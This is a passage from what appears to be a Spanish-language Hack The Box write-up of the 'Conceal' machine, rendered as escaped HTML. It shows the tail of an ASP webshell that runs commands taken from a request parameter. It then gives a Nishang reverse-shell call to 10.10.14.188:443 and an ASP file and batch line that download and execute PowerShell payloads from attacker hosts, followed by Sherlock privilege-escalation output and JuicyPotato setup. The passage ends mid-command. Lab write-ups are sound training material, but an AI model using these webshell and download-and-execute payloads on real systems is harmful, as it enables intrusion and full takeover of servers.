    Dim objShell, objCmdExec
    Set objShell = CreateObject(&amp;#34;WScript.Shell&amp;#34;)
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&amp;gt;


&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;HTML&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;BODY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;FORM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;45&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;lt;%= szCMD %&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Run&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;FORM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;PRE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%= &amp;#34;\\&amp;#34; &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; oScriptNet.ComputerName &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; &amp;#34;\&amp;#34; &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; oScriptNet.UserName %&amp;gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%Response.Write(Request.ServerVariables(&amp;#34;server_name&amp;#34;))%&amp;gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;The server&amp;#39;s port:&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%Response.Write(Request.ServerVariables(&amp;#34;server_port&amp;#34;))%&amp;gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;The server&amp;#39;s software:&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%Response.Write(Request.ServerVariables(&amp;#34;server_software&amp;#34;))%&amp;gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;The server&amp;#39;s software:&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%Response.Write(Request.ServerVariables(&amp;#34;LOCAL_ADDR&amp;#34;))%&amp;gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;% szCMD = request(&amp;#34;cmd&amp;#34;)
thisDir = getCommandOutput(&amp;#34;cmd /c&amp;#34; &lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt; szCMD)
Response.Write(thisDir)%&amp;gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;BODY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;HTML&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-08%2019.07.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra webshell y podemos ejecutar comandos en la maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-08%2019.08.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;reverse-shell---nishang&#34;&gt;REVERSE SHELL - Nishang&lt;/h2&gt;
&lt;p&gt;Utilizamos una de las shells que tiene nishang &lt;a href=&#34;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1,&#34;&gt;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1,&lt;/a&gt; y configuramos un archivo asp para subirlo por ftp y al visitar dicho archivo obtener una shell inversa.&lt;/p&gt;
&lt;p&gt;En nuestro archivo &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; agregamos la sigueinte linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-PowerShellTcp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Reverse&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-IPAddress&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;188&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nuestro archivo &lt;code&gt;rev_shell.asp&lt;/code&gt; contiene lo siguiente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%@ Language=VBScript %&amp;gt;
&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%
  call Server.CreateObject(&amp;#34;WSCRIPT.SHELL&amp;#34;).Run(&amp;#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&amp;#39;http://10.10.14.188/Invoke-PowerShellTcp.ps1&amp;#39;)&amp;#34;)
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;video autoplay&gt;
    &lt;source src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screen record from 2019-04-09 22.18.36.mov&#34; type=&#34;video/mp4&#34;&gt;
&lt;/video&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;user&#34;&gt;USER&lt;/h2&gt;
&lt;p&gt;Obtenemos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-09%2023.33.44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;systeminfo&#34;&gt;Systeminfo&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-09%2023.59.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;sherlok&#34;&gt;Sherlok&lt;/h3&gt;
&lt;p&gt;Utilizando Sherlok para buscar parches que nos pueda servir para escalar privilegios, no encontramos ninguno :/.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; iex&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;new-object net.webclient&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.downloadstring&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.14.188/Sherlok.ps1&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; ls
PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;estitute&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; Find-Allvulns


Title      : User Mode to Ring &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;KiTrap0D&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : &lt;span class=&#34;s1&#34;&gt;&amp;#39;mrxdav.sys&amp;#39;&lt;/span&gt; WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;whoami-priv&#34;&gt;WHOAMI /priv&lt;/h3&gt;
&lt;p&gt;Revisamos si &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; esta disponible en la maquina y con el usuario que actualmente tenemos una shell para poder utilizar &lt;code&gt;JuicyPotato&lt;/code&gt; para obtener &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-09%2023.35.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;privilege-escalation---juicypotato&#34;&gt;PRIVILEGE ESCALATION - JuicyPotato&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ohpe/juicy-potato&#34;&gt;https://github.com/ohpe/juicy-potato&lt;/a&gt;&lt;br /&gt;
Para escalar privilegios vamos a utilizar un nuevo documento &lt;code&gt;Invoke-PowerShellTcp-potato.ps1&lt;/code&gt; que contiene una shell inversa, tambien un archivo &lt;code&gt;reverse_shell.bat&lt;/code&gt; el cual va ser ejecutado por &lt;code&gt;JuicyPotato.exe&lt;/code&gt; (&lt;a href=&#34;https://ohpe.it/juicy-potato/),&#34;&gt;https://ohpe.it/juicy-potato/),&lt;/a&gt; se puede descargar &lt;code&gt;JuicyPotato.exe&lt;/code&gt; aqui. (&lt;a href=&#34;https://ohpe.it/juicy-potato/)&#34;&gt;https://ohpe.it/juicy-potato/)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;reverse_shell.bat&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;new-object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webclient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;downloadstring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.12.64/Invoke-PowerShellTcp-potato.ps1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;clsid&#34;&gt;CLSID&lt;/h3&gt;
&lt;p&gt;Para obtener CLSID para juicypotato vamos a utilizar los siguientes comandos en powershell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;New-PSDrive&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKCR&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PSProvider&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Registry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Root&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKEY_CLASSES_ROOT&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CLSID&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKCR&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clsid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select-object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AppID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,@{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;CLSID&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pschildname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;where-object&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-ne&lt;/span&gt; &lt;span 